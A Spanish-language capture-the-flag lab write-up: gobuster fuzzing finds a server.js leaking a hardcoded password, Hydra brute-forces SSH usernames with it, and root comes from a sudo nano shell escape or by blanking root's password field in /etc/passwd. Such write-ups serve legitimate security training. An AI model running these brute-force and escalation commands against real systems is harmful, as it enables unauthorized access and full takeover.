## Reconocimiento:

Puerto 80 : HTTP

Puerto 3000 : Node,js Express Framework

Puerto 5000 : SSH

En la web de primeras no veo nada, le aplico fuzzing:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k -r
```

Encuentro /backend y dentro hay un archivo interesante llamado server.js:

```jsx
const express = require('express');
const app = express();

const port = 3000;

app.use(express.json());

app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});
```

Revelando una posible contraseña:

```bash
lapassworddebackupmaschingonadetodas
```

Le aplico un ataque con Hydra por el puerto 5000 ya que alojaron SSH en ese puerto:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -t 64 -I 
```

User : lovely

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/nano
```

Se ejecuta desde el programa:

```bash
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

O también se puede editar el archivo /etc/passwd y remover la “x” del usuario root.

Listo.
